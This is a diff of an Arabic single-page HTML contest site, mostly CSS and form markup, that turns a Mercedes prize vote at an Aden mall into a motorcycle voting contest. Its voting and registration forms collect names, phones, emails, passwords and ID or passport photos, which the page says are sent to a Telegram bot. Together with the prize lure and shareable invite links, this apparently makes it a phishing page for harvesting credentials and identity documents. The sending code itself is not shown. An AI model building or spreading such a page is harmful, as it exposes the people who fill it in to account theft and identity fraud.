-  /* ===== التسجيل والتذكرة ===== */
-  .reg-shell {
-    background: var(--grad-card);
-    border: 1.5px solid var(--border-gold);
-    border-radius: 38px; padding: 40px;
-    box-shadow: 0 32px 75px rgba(0,0,0,0.82);
+  .row-sub {
+    font-size: 12px;
+    color: var(--text-sub);
   }
-  .reg-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px; }
-  .full-row { grid-column: 1 / -1; }
+
+  .row-code {
+    color: var(--amber-bright);
+    font-weight: 800;
+    direction: ltr;
+    display: inline-block;
+  }
+
+  .votes-badge {
+    background: rgba(16, 185, 129, 0.16);
+    border: 1px solid rgba(16, 185, 129, 0.45);
+    color: #6ee7b7;
+    padding: 4px 12px;
+    border-radius: 999px;
+    font-size: 13px;
+    font-weight: 900;
+    white-space: nowrap;
+  }
+
+  .vote-mini-btn {
+    margin-top: 5px;
+    background: var(--grad-amber);
+    color: #060d14;
+    border: none;
+    border-radius: 8px;
+    padding: 4px 11px;
+    font-size: 11.5px;
+    font-weight: 900;
+    cursor: pointer;
+  }
+
+  .admin-ctrl {
+    display: none;
+  }
+
+  body.admin-on .admin-ctrl {
+    display: inline-block;
+  }
+
+  .del-btn {
+    margin-top: 5px;
+    background: rgba(244, 63, 94, 0.2);
+    border: 1px solid var(--danger);
+    color: #fda4af;
+    border-radius: 8px;
+    padding: 3px 9px;
+    font-size: 11px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+
+  .admin-bar {
+    margin-top: 16px;
+    padding-top: 14px;
+    border-top: 1px dashed var(--border-line);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  .admin-action {
+    border-radius: 10px;
+    padding: 8px 12px;
+    font-size: 12px;
+    font-weight: 800;
+    cursor: pointer;
+  }
+
+  /* ===== نموذج التسجيل وتذكرته ===== */
+  .reg-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 16px;
+  }
+
+  .reg-grid .full-col {
+    grid-column: 1 / -1;
+  }
 
   #ticketResult {
-    display: none; text-align: center; padding: 38px 22px;
-    background: #0b0e16;
-    border: 2px dashed var(--gold);
-    border-radius: 30px;
+    display: none;
+    text-align: center;
+    padding: 28px 18px;
+    background: rgba(6, 13, 20, 0.85);
+    border: 1.5px dashed var(--amber);
+    border-radius: 22px;
   }
-  .ticket-pill {
+
+  .code-display {
     display: inline-block;
-    background: rgba(242, 193, 78, 0.14);
-    border: 2px solid var(--gold);
-    color: var(--gold-bright);
-    font-size: 32px; font-weight: 900;
-    padding: 12px 34px; border-radius: 20px;
-    margin: 14px 0; letter-spacing: 3px; direction: ltr;
-  }
-  .share-preview {
-    background: #121621;
-    border: 1px solid var(--border-gold);
-    color: #f9fafb;
-    padding: 18px; border-radius: 18px;
-    font-size: 14px; line-height: 1.85;
-    text-align: right; white-space: pre-line;
-    margin: 14px auto; max-width: 620px;
-  }
-  .copy-action {
-    background: var(--grad-gold); color: #050608;
-    border: none; padding: 13px 28px; border-radius: 999px;
-    font-weight: 900; font-size: 15px; cursor: pointer; margin-top: 8px;
+    margin: 12px 0;
+    padding: 10px 28px;
+    border-radius: 16px;
+    background: rgba(245, 158, 11, 0.14);
+    border: 2px solid var(--amber);
+    color: var(--amber-bright);
+    font-size: 28px;
+    font-weight: 900;
+    letter-spacing: 2px;
+    direction: ltr;
   }
 
-  /* ===== أجنحة المول والموقع ===== */
-  .wings-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
-  .wing-box {
-    background: var(--grad-card);
+  .invite-box {
+    max-width: 640px;
+    margin: 14px auto;
+    padding: 16px;
+    border-radius: 16px;
+    background: #07111a;
     border: 1px solid var(--border-line);
-    border-radius: 26px; padding: 26px 20px; text-align: center; transition: 0.2s;
+    color: #e2e8f0;
+    font-size: 13.5px;
+    line-height: 1.8;
+    text-align: right;
+    white-space: pre-line;
   }
-  .wing-box:hover { transform: translateY(-5px); border-color: var(--gold); }
-  .wing-box.vip { border: 2px solid var(--gold); }
-  .wing-icon { font-size: 44px; display: block; margin-bottom: 10px; }
-  .wing-box h3 { color: var(--gold-bright); font-size: 20px; font-weight: 900; margin-bottom: 8px; }
-  .wing-box p { color: var(--text-dim); font-size: 13.5px; }
 
-  .loc-box {
-    background: var(--grad-card);
-    border: 1.5px solid var(--border-gold);
-    border-radius: 28px; padding: 30px;
-    display: flex; align-items: center; justify-content: space-between;
-    flex-wrap: wrap; gap: 20px;
+  /* ===== التواصل والفوتر ===== */
+  .contact-card {
+    background: var(--grad-surface);
+    border: 1px solid var(--border-line);
+    border-radius: 22px;
+    padding: 24px 28px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
   }
-  .loc-text h3 { color: var(--gold-bright); font-size: 22px; font-weight: 900; margin-bottom: 4px; }
-  .loc-text p { color: #d1d5db; font-size: 15px; }
 
-  .phone-pills { display: flex; gap: 12px; flex-wrap: wrap; }
-  .phone-pill {
-    background: rgba(242, 193, 78, 0.14);
-    border: 1px solid var(--gold);
-    color: var(--gold-bright); text-decoration: none;
-    padding: 11px 22px; border-radius: 15px;
-    font-weight: 800; direction: ltr;
+  .contact-card h3 {
+    font-size: 20px;
+    font-weight: 900;
+    color: var(--amber-bright);
+  }
+
+  .contact-card p {
+    font-size: 14px;
+    color: var(--text-sub);
+  }
+
+  .tel-group {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .tel-link {
+    text-decoration: none;
+    background: rgba(245, 158, 11, 0.14);
+    border: 1px solid var(--amber);
+    color: var(--amber-bright);
+    padding: 10px 18px;
+    border-radius: 12px;
+    font-weight: 800;
+    direction: ltr;
   }
 
   footer {
-    background: #040508;
-    border-top: 1px solid rgba(242, 193, 78, 0.22);
-    text-align: center; padding: 45px 20px; margin-top: 70px;
-    color: var(--text-dim);
+    background: #04090e;
+    border-top: 1px solid var(--border-line);
+    text-align: center;
+    padding: 32px 20px;
+    margin-top: 56px;
+    color: var(--text-sub);
   }
-  footer h3 { color: var(--gold-bright); font-size: 24px; font-weight: 900; margin-bottom: 6px; }
+
+  footer strong {
+    display: block;
+    font-size: 20px;
+    font-weight: 900;
+    color: var(--amber-bright);
+    margin-bottom: 4px;
+  }
 
   @media (max-width: 900px) {
-    .hero-card, .arena-columns { grid-template-columns: 1fr; }
-    .hero-card h1 { font-size: 32px; }
-    .arena-shell, .reg-shell { padding: 24px 16px; }
+    .hero-panel, .two-col {
+      grid-template-columns: 1fr;
+    }
+    .hero-panel h1 {
+      font-size: 30px;
+    }
+    .panel-box {
+      padding: 20px 14px;
+    }
   }
 </style>
 </head>
 <body>
 
-<!-- ===== بوابة الترحيب ===== -->
-<div id="introGate">
-  <div class="gate-card">
-    <div class="gate-tag">🏛️ البيرق مول • عدن — جولة البيرق</div>
-    <h2>مسابقة التصويت الكبرى على سيارة مرسيدس!</h2>
-    <p>مرحباً بك في <strong>البيرق مول</strong> — أضخم مول في العاصمة عدن. سجّل كمتسابق وشارك رابطك الخاص، أو صوّت الآن لمرشحك المفضل للفوز بسيارة <strong>مرسيدس</strong>.</p>
-    <div class="gate-btns">
-      <button class="g-btn gold" onclick="scrollToSection('register')">🎟️ سجّل كمتسابق واحصل على رابطك</button>
-      <button class="g-btn crimson" onclick="scrollToSection('voting')">🗳️ الدخول إلى ساحة التصويت المباشر</button>
+<!-- ===== الشريط العلوي ===== -->
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <span>أمير المترات</span>
+      <span class="brand-pill">صفحة موحدة • سعة 500</span>
     </div>
-  </div>
-</div>
-
-<!-- ===== شريط التنقل الزجاجي ===== -->
-<header class="nav-shell">
-  <div class="nav-bar">
-    <a href="#" class="mall-brand">
-      <svg class="mall-emblem" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="3" y="3" width="58" height="58" rx="16" fill="#080a0f" stroke="#f2c14e" stroke-width="2.5"/>
-        <path d="M18 48V15H45L39 24.5L45 34H18" fill="url(#goldFlag)" stroke="#fff1b8" stroke-width="1.2"/>
-        <circle cx="46" cy="46" r="5" fill="#e11d48"/>
-        <defs>
-          <linearGradient id="goldFlag" x1="18" y1="15" x2="45" y2="36" gradientUnits="userSpaceOnUse">
-            <stop stop-color="#fff1b8"/>
-            <stop offset="0.55" stop-color="#f2c14e"/>
-            <stop offset="1" stop-color="#9b6910"/>
-          </linearGradient>
-        </defs>
-      </svg>
-      <div class="mall-brand-text">
-        <strong>البيرق مول • عدن</strong>
-        <span>جولة البيرق — جائزة مرسيدس</span>
-      </div>
-    </a>
-
-    <nav class="nav-actions">
-      <a href="#voting" class="btn-vote">🗳️ التصويت المباشر</a>
-      <a href="#register" class="btn-join">🎟️ تسجيل متسابق</a>
-      <a href="#wings">أقسام المول</a>
-      <a href="#location">الموقع</a>
+    <nav class="nav-menu">
+      <a href="#models">المترات</a>
+      <a href="#voting" class="pill-amber">التصويت والترتيب</a>
+      <a href="#register" class="pill-emerald">تسجيل متسابق</a>
+      <a href="#contact">التواصل</a>
     </nav>
   </div>
 </header>
 
-<!-- ===== الواجهة الرئيسية وبطاقة سيارة مرسيدس ===== -->
-<div class="hero-section">
-  <div class="hero-card">
+<!-- ===== الواجهة الافتتاحية الموحدة ===== -->
+<div class="hero-wrap">
+  <div class="hero-panel">
     <div>
-      <div class="city-ribbon">✨ الأضخم في عدن — جولة البيرق (المنصورة)</div>
-      <h1>منافسة <span>البيرق مول</span> الكبرى<br>على سيارة مرسيدس الفاخرة!</h1>
-      <p>أداء سريع ووصول مباشر لبوت التليجرام، وتصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لتوسيع المنافسة وتحقيق أعلى تفاعل بكل نزاهة.</p>
-      <div style="display:flex; gap:12px; flex-wrap:wrap;">
-        <a href="#voting" class="submit-btn gold" style="text-decoration:none; text-align:center; width:auto; padding:13px 26px; border-radius:999px; font-size:15px;">🗳️ صوّت الآن</a>
-        <a href="#register" class="submit-btn crimson" style="text-decoration:none; text-align:center; width:auto; padding:13px 26px; border-radius:999px; font-size:15px;">🎟️ اشترك في المسابقة</a>
+      <div class="hero-kicker">🏆 مسابقة وتصويت متر فلينج (FELLING) — سعة حتى 500 متسابق</div>
+      <h1>كل شيء في صفحة واحدة مع <span>أمير المترات</span></h1>
+      <p>تصفح فئات المترات، صوّت بدقة مع التحقق من الهوية ومنع التكرار، أو سجّل كمتسابق واحصل فوراً على رمزك ورسالة الدعوة المباشرة للمشاركة.</p>
+      <div class="hero-btns">
+        <a href="#voting" class="btn-main-amber">🗳️ انتقل للتصويت والترتيب</a>
+        <a href="#register" class="btn-main-emerald">🎟️ سجّل كمتسابق الآن</a>
       </div>
     </div>
 
-    <div class="mercedes-frame-card">
-      <div class="car-stage">
-        <img id="carImageEl"
-             src="https://images.unsplash.com/photo-1618843479313-40f8afb4b4d8?auto=format&fit=crop&w=1000&q=80"
-             alt="سيارة مرسيدس جائزة البيرق مول عدن">
+    <div class="hero-metric-box">
+      <div class="metric-cell">
+        <strong id="heroCapVal">0 / 500</strong>
+        <span>سعة المتسابقين</span>
       </div>
-      <div class="view-tabs">
-        <button type="button" class="view-tab active" onclick="setCarView(0, this)">الواجهة الفاخرة</button>
-        <button type="button" class="view-tab" onclick="setCarView(1, this)">إطلالة رياضية</button>
-        <button type="button" class="view-tab" onclick="setCarView(2, this)">مقصورة ملكية</button>
+      <div class="metric-cell">
+        <strong id="heroVotesVal">0</strong>
+        <span>إجمالي الأصوات</span>
       </div>
-      <div class="car-footer-bar">
-        <strong>🚘 الجائزة الكبرى: سيارة مرسيدس</strong>
-        <span>🏛️ البيرق مول — عدن</span>
+      <div class="metric-cell">
+        <strong>100%</strong>
+        <span>تحقق وهوية لكل صوت</span>
+      </div>
+      <div class="metric-cell">
+        <strong>فوري</strong>
+        <span>إرسال وتحديث للبوت</span>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ===== ساحة التصويت والنتائج المباشرة ===== -->
-<section id="voting">
-  <div class="sec-title-wrap">
-    <span class="kicker">أداء سريع • تحديث فوري للترتيب</span>
-    <h2>🗳️ ساحة التصويت والنتائج المباشرة</h2>
+<!-- ===== 1. معرض المترات والصور ===== -->
+<section id="models" class="page-section">
+  <div class="sec-title">
+    <h2>أقسام وفئات المترات في المعرض</h2>
+    <span>اختر الفئة المفضلة لتعبئة التسجيل تلقائياً</span>
   </div>
 
-  <div class="arena-shell">
-    <div class="status-row">
-      <div class="status-tag"><span class="pulse-lamp"></span> مفتوح لجميع الأجهزة برقم وبريد وهوية مختلفة</div>
-      <div class="status-tag" style="border-color:var(--gold); color:var(--gold-bright);" id="counterBadge">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
+  <div class="models-grid">
+    <div class="model-card">
+      <div class="model-banner">
+        <span class="model-tag">الجائزة الكبرى</span>
+        <span class="model-emoji">🏍️</span>
+      </div>
+      <div class="model-body">
+        <h3>متر فلينج (FELLING)</h3>
+        <p>أداء قوي، ثبات ممتاز، وتصميم عملي متكامل وهو المتر الرئيسي للمسابقة.</p>
+        <button type="button" class="model-btn" onclick="chooseModel('متر فلينج (FELLING)')">اختيار في التسجيل</button>
+      </div>
     </div>
 
-    <div class="fairness-alert">
-      <span>🛡️</span>
-      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> يُسمح بالتصويت من أي جهاز عند استخدام رقم وبريد ووثيقة مختلفة، لكن يُمنع منعاً باتاً تكرار نفس الرقم أو البريد أو إرفاق وثائق/بيانات مزورة أو انتحال الهوية. أي محاولة احتيال أو تلاعب تؤدي فوراً لرفض الصوت واستبعاد المخالف وحذف الأصوات المخالفة.</p>
+    <div class="model-card">
+      <div class="model-banner">
+        <span class="model-tag">أداء رياضي</span>
+        <span class="model-emoji">🏁</span>
+      </div>
+      <div class="model-body">
+        <h3>المترات الرياضية (Sport)</h3>
+        <p>انسيابية حديثة واستجابة سريعة مع تجهيزات مناسبة للطرقات المختلفة.</p>
+        <button type="button" class="model-btn" onclick="chooseModel('مترات رياضية (Sport)')">اختيار في التسجيل</button>
+      </div>
     </div>
 
-    <div class="arena-columns">
+    <div class="model-card">
+      <div class="model-banner">
+        <span class="model-tag">تحمل يومي</span>
+        <span class="model-emoji">🛵</span>
+      </div>
+      <div class="model-body">
+        <h3>مترات العمل والتوصيل</h3>
+        <p>مصممة للعمل اليومي المستمر بكفاءة تشغيل واقتصادية واضحة.</p>
+        <button type="button" class="model-btn" onclick="chooseModel('مترات العمل والتوصيل')">اختيار في التسجيل</button>
+      </div>
+    </div>
+
+    <div class="model-card">
+      <div class="model-banner">
+        <span class="model-tag">طرق وعرة</span>
+        <span class="model-emoji">⛰️</span>
+      </div>
+      <div class="model-body">
+        <h3>المترات الجبلية والوعرة</h3>
+        <p>عزم مناسب للمرتفعات والمنحدرات والظروف التشغيلية الشاقة.</p>
+        <button type="button" class="model-btn" onclick="chooseModel('المترات الجبلية والوعرة')">اختيار في التسجيل</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 2. ساحة التصويت والترتيب المباشر ===== -->
+<section id="voting" class="page-section">
+  <div class="sec-title">
+    <h2>التصويت والترتيب المباشر للمتسابقين</h2>
+    <span>فرز تلقائي حسب أعلى الأصوات</span>
+  </div>
+
+  <div class="panel-box">
+    <div class="status-strip">
+      <div class="status-badge"><span class="dot-live"></span> نظام التصويت والتحقق نشط</div>
+      <div class="status-badge" id="boardSummaryBadge">المتسابقون: 0/500 • الأصوات: 0</div>
+    </div>
+
+    <div class="alert-box">
+      <strong>تنبيه الدقة والنزاهة:</strong> يُمنع تكرار رقم الهاتف أو البريد الإلكتروني للتصويت أكثر من مرة، ويُمنع تصويت المتسابق لنفسه، ويجب إرفاق صورة الهوية/الجواز للتحقق. أي مخالفة أو بيانات غير صحيحة تؤدي لرفض الصوت أو استبعاد المتسابق.
+    </div>
+
+    <div class="two-col">
       <!-- نموذج التصويت -->
-      <div class="box-panel">
-        <h3>✍️ صوّت لمرشحك المفضل</h3>
-        <p class="hint">اختر المتسابق أو أدخل رمزه، وأكمل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
+      <div class="sub-panel">
+        <h3>إرسال صوت جديد</h3>
+        <p class="hint">اختر المتسابق أو أدخل رمزه، وأكمل بياناتك وصورة الهوية.</p>
 
-        <div id="refBanner" class="referral-notice">
-          🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
-          <strong id="refTargetName"></strong>
+        <div id="inviteBanner" class="invite-banner">
+          رابط دعوة مباشر للمتسابق: <strong id="inviteTargetLabel"></strong>
         </div>
 
         <form id="voteForm">
-          <div class="field-box">
-            <label for="candSelect">🏆 اختر المتسابق أو أدخل رمزه *</label>
-            <select id="candSelect" onchange="syncCodeBox()">
-              <option value="">-- اختر متسابقاً من القائمة --</option>
+          <div class="field">
+            <label for="candidateSelect">اختر المتسابق *</label>
+            <select id="candidateSelect" onchange="syncCodeFromSelect()">
+              <option value="">-- اختر متسابقاً --</option>
             </select>
           </div>
 
-          <div class="field-box">
-            <label for="codeBox">🎟️ رمز تذكرة المتسابق *</label>
-            <input type="text" id="codeBox" required placeholder="BAYRAQ-7272" dir="ltr" style="text-align:center; font-weight:900; font-size:17px; letter-spacing:2px; text-transform:uppercase; border-color:var(--gold);">
+          <div class="field">
+            <label for="candidateCodeInput">رمز المتسابق *</label>
+            <input type="text" id="candidateCodeInput" required placeholder="AMIR-7272" dir="ltr" style="text-align:center; font-weight:900; letter-spacing:2px; text-transform:uppercase;">
           </div>
 
-          <div class="field-box">
-            <label for="voterNameInp">🙋‍♂️ اسمك الكامل (المُصوِّت) *</label>
-            <input type="text" id="voterNameInp" required placeholder="أدخل اسمك الكامل">
+          <div class="field">
+            <label for="voterName">اسم المصوّت الكامل *</label>
+            <input type="text" id="voterName" required placeholder="أدخل اسمك الكامل">
           </div>
 
-          <div class="field-box">
-            <label for="voterPhoneInp">📱 رقم هاتفك (يُمنع تكرار الرقم) *</label>
-            <input type="tel" id="voterPhoneInp" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
+          <div class="field">
+            <label for="voterPhone">رقم الهاتف (غير مكرر) *</label>
+            <input type="tel" id="voterPhone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
           </div>
 
-          <div class="field-box">
-            <label for="voterEmailInp">📧 بريدك الإلكتروني (يُمنع تكرار البريد) *</label>
-            <input type="email" id="voterEmailInp" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
+          <div class="field">
+            <label for="voterEmail">البريد الإلكتروني (غير مكرر) *</label>
+            <input type="email" id="voterEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
           </div>
 
-          <!-- كلمة السر تحت البريد الإلكتروني مباشرة -->
-          <div class="field-box">
-            <label for="voterPassInp">🔒 كلمة السر *</label>
-            <div class="pass-holder">
-              <input type="password" id="voterPassInp" required placeholder="أدخل كلمة سر لحسابك" dir="ltr" style="text-align:right">
-              <button type="button" class="pass-eye" onclick="togglePass('voterPassInp', this)">إظهار</button>
+          <div class="field">
+            <label for="voterPassword">كلمة السر *</label>
+            <div class="pass-wrap">
+              <input type="password" id="voterPassword" required placeholder="أدخل كلمة سر" dir="ltr" style="text-align:right">
+              <button type="button" class="pass-btn" onclick="togglePass('voterPassword', this)">إظهار</button>
             </div>
           </div>
 
-          <!-- صورة البطاقة الشخصية أو الجواز للمُصوِّت -->
-          <div class="field-box">
-            <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
-            <div class="drop-card" onclick="document.getElementById('voterDocInp').click()">
-              <span class="drop-ico">🆔</span>
-              <div class="drop-title">اضغط هنا لإرفاق صورة البطاقة أو الجواز</div>
-              <div class="drop-note">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</div>
-              <input type="file" id="voterDocInp" accept="image/*" required onchange="compressImageFile(event, 'voterDocPrev')">
-              <img id="voterDocPrev" class="img-thumb" alt="معاينة هوية المصوت">
+          <div class="field">
+            <label>صورة البطاقة الشخصية أو الجواز للمصوّت *</label>
+            <div class="file-drop" onclick="document.getElementById('voterIdImage').click()">
+              <span class="f-title">اضغط لإرفاق صورة البطاقة أو الجواز</span>
+              <span class="f-sub">تُضغط تلقائياً وتُرسل للبوت للتحقق</span>
+              <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
+              <img id="voterIdPreview" class="img-prev" alt="معاينة هوية المصوّت">
             </div>
           </div>
 
-          <div class="calc-box">
-            <span id="mathQ">🔐 كم ناتج: 6 + 4 = ؟</span>
-            <input type="number" id="mathAnsInp" required placeholder="الناتج">
+          <div class="captcha-row">
+            <span id="captchaQuestion">8 + 4 = ?</span>
+            <input type="number" id="captchaAnswer" required placeholder="الناتج">
           </div>
 
-          <button type="submit" id="voteSubmit" class="submit-btn gold">🗳️ اعتمد صوتي الآن</button>
-          <div id="voteMsg" class="status-msg"></div>
+          <button type="submit" id="voteSubmitBtn" class="btn-submit amber">اعتماد الصوت الآن</button>
+          <div id="voteFeedback" class="feedback"></div>
 
-          <!-- رسالة شكر باسم البيرق مول بعد التصويت -->
-          <div id="mallThanksCard" class="thanks-box">
-            <h4>🙏 شكراً جزيلاً لتصويتك ومشاركتك الكريمة!</h4>
-            <p id="mallThanksBody">تم اعتماد صوتك بنجاح، ونشكركم على دعمكم ومشاركتكم في مسابقة البيرق مول الكبرى على سيارة مرسيدس.</p>
-            <span class="badge-mall">🏛️ مع خالص الشكر والتقدير — البيرق مول • عدن</span>
+          <div id="voteThanksBox" class="thanks-box">
+            <h4>شكراً لتصويتك لدى أمير المترات</h4>
+            <p id="voteThanksText">تم احتساب صوتك بنجاح وإرساله للبوت.</p>
           </div>
         </form>
       </div>
 
-      <!-- الترتيب المباشر -->
-      <div class="box-panel">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
-          <h3>🏆 الترتيب المباشر للمتسابقين</h3>
-          <button type="button" onclick="syncStateFromCloud(true)" style="background:rgba(242,193,78,0.14); border:1px solid var(--gold); color:var(--gold-bright); padding:4px 12px; border-radius:10px; font-size:12px; font-weight:800; cursor:pointer;">🔄 تحديث فوري</button>
+      <!-- لوحة المتصدرين -->
+      <div class="sub-panel">
+        <div style="display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:6px; flex-wrap:wrap;">
+          <h3>الترتيب المباشر (حتى 500 متسابق)</h3>
+          <button type="button" onclick="syncFromTelegramCloud(true)" style="background:rgba(16,185,129,0.15); border:1px solid var(--emerald); color:#6ee7b7; padding:4px 12px; border-radius:8px; font-size:12px; font-weight:800; cursor:pointer;">تحديث الآن</button>
         </div>
-        <p class="hint">يتم ترتيب المتسابقين تلقائياً من الأعلى تصويتاً إلى الأقل:</p>
+        <p class="hint">الترتيب تنازلي حسب عدد الأصوات الفعلية.</p>
 
-        <input type="text" id="searchBoardInp" class="search-field" placeholder="🔍 ابحث عن متسابق أو رمز (مثال: خلدون أو BAYRAQ-7272)..." oninput="renderBoard()">
+        <input type="text" id="searchInput" class="search-box" placeholder="ابحث بالاسم أو الرمز أو المنطقة..." oninput="renderBoard()">
 
-        <div class="board-scroll" id="boardList">
-          <div style="text-align:center; padding:30px; color:var(--text-dim);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
+        <div id="leaderboardList" class="board-scroll">
+          <div style="text-align:center; padding:24px; color:var(--text-sub);">جارٍ تحميل القائمة...</div>
         </div>
 
-        <!-- شريط الإدارة (أزرار التقرير والفحص وتحديث الصورة تظهر داخل وضع الإدارة فقط) -->
-        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed #242938; display:flex; gap:10px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
-          <div class="admin-only-area">
-            <button type="button" onclick="sendBoardReport()" style="background:rgba(242,193,78,0.14); border:1px solid var(--gold); color:var(--gold-bright); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
-              📊 إرسال التقرير للبوت
-            </button>
-            <button type="button" onclick="testBotStatus()" style="background:rgba(16,185,129,0.14); border:1px solid var(--jade); color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
-              📡 فحص البوت
-            </button>
+        <div class="admin-bar">
+          <div style="display:flex; gap:8px; flex-wrap:wrap;">
+            <button type="button" class="admin-action admin-ctrl" onclick="sendSortedReportToBot()" style="background:rgba(16,185,129,0.14); border:1px solid var(--emerald); color:#6ee7b7;">إرسال التقرير للبوت</button>
+            <button type="button" class="admin-action admin-ctrl" onclick="testBotConnection()" style="background:rgba(251,191,36,0.14); border:1px solid var(--amber); color:var(--amber-bright);">فحص البوت</button>
           </div>
-          <button type="button" onclick="toggleAdminMode()" style="background:rgba(242,193,78,0.14); border:1px solid var(--gold); color:var(--gold-bright); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
-            🔐 وضع الإدارة
-          </button>
-
-          <div class="admin-only-area car-editor-panel">
-            <label for="customCarInput">🚘 تخصيص رابط صورة سيارة مرسيدس (إداري):</label>
-            <div class="car-editor-controls">
-              <input type="url" id="customCarInput" placeholder="https://... رابط صورة سيارة مرسيدس">
-              <button type="button" onclick="updateCustomCar()" style="background:var(--grad-gold); color:#050608; border:none; padding:9px 16px; border-radius:10px; font-weight:900; font-size:12.5px; cursor:pointer;">تحديث الصورة</button>
-            </div>
-          </div>
+          <button type="button" class="admin-action" onclick="toggleAdmin()" style="background:rgba(255,255,255,0.06); border:1px solid var(--border-line); color:#e2e8f0;">وضع الإدارة</button>
         </div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== استمارة تسجيل المتسابقين ===== -->
-<section id="register">
-  <div class="sec-title-wrap">
-    <span class="kicker">بوابة التسجيل (سعة حتى 100 متسابق)</span>
-    <h2>سجّل بياناتك واحصل على رسالة ورابط التصويت الخاص بك</h2>
+<!-- ===== 3. تسجيل المتسابقين ===== -->
+<section id="register" class="page-section">
+  <div class="sec-title">
+    <h2>تسجيل متسابق جديد وإصدار رابط التصويت</h2>
+    <span>الحد الأقصى: 500 متسابق</span>
   </div>
 
-  <div class="reg-shell">
-    <form id="joinForm">
+  <div class="panel-box">
+    <form id="registerForm">
       <div class="reg-grid">
-        <div class="field-box">
-          <label for="regFullName">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
-          <input type="text" id="regFullName" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
+        <div class="field">
+          <label for="regName">الاسم الكامل (مطابق للهوية) *</label>
+          <input type="text" id="regName" required placeholder="أدخل اسمك الرباعي كما في الهوية">
         </div>
 
-        <div class="field-box">
-          <label for="regPhoneInp">📱 رقم الهاتف / واتساب *</label>
-          <input type="tel" id="regPhoneInp" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
+        <div class="field">
+          <label for="regPhone">رقم الهاتف / واتساب *</label>
+          <input type="tel" id="regPhone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
         </div>
 
-        <div class="field-box">
-          <label for="regEmailInp">📧 عنوان البريد الإلكتروني *</label>
-          <input type="email" id="regEmailInp" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
+        <div class="field">
+          <label for="regEmail">البريد الإلكتروني *</label>
+          <input type="email" id="regEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
         </div>
 
-        <div class="field-box">
-          <label for="regPassInp">🔒 كلمة المرور لحسابك في المسابقة *</label>
-          <div class="pass-holder">
-            <input type="password" id="regPassInp" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
-            <button type="button" class="pass-eye" onclick="togglePass('regPassInp', this)">إظهار</button>
+        <div class="field">
+          <label for="regPassword">كلمة المرور *</label>
+          <div class="pass-wrap">
+            <input type="password" id="regPassword" required placeholder="أدخل كلمة مرور" dir="ltr" style="text-align:right">
+            <button type="button" class="pass-btn" onclick="togglePass('regPassword', this)">إظهار</button>
           </div>
         </div>
 
-        <div class="field-box">
-          <label for="regZoneInp">🏙️ المنطقة / المديرية *</label>
-          <input type="text" id="regZoneInp" required placeholder="مثال: جولة البيرق - المنصورة - عدن">
+        <div class="field">
+          <label for="regCity">المحافظة / المنطقة *</label>
+          <input type="text" id="regCity" required placeholder="مثال: صنعاء - تعز - إب - القاعدة">
         </div>
 
-        <div class="field-box">
-          <label for="regWingSel">🏛️ القسم المفضل في البيرق مول *</label>
-          <select id="regWingSel" required>
-            <option value="جناح سيارة مرسيدس والسيارات">جناح سيارة مرسيدس والسيارات</option>
-            <option value="البيرق للتقنية والإلكترونيات">البيرق للتقنية والإلكترونيات</option>
-            <option value="أزياء وموضة البيرق">أزياء وموضة البيرق</option>
-            <option value="الترفيه والمطاعم العائلية">الترفيه والمطاعم العائلية</option>
+        <div class="field">
+          <label for="regModel">المتر المفضل *</label>
+          <select id="regModel" required>
+            <option value="متر فلينج (FELLING)">متر فلينج (FELLING)</option>
+            <option value="مترات رياضية (Sport)">مترات رياضية (Sport)</option>
+            <option value="مترات العمل والتوصيل">مترات العمل والتوصيل</option>
+            <option value="المترات الجبلية والوعرة">المترات الجبلية والوعرة</option>
           </select>
         </div>
 
-        <div class="field-box full-row">
-          <label for="regNoteInp">💬 رسالة للجمهور ليصوتوا لك (اختياري)</label>
-          <textarea id="regNoteInp" placeholder="اكتب عبارة تشجيعية أو سبب استحقاقك للفوز..."></textarea>
+        <div class="field full-col">
+          <label for="regNote">كلمة للجمهور (اختياري)</label>
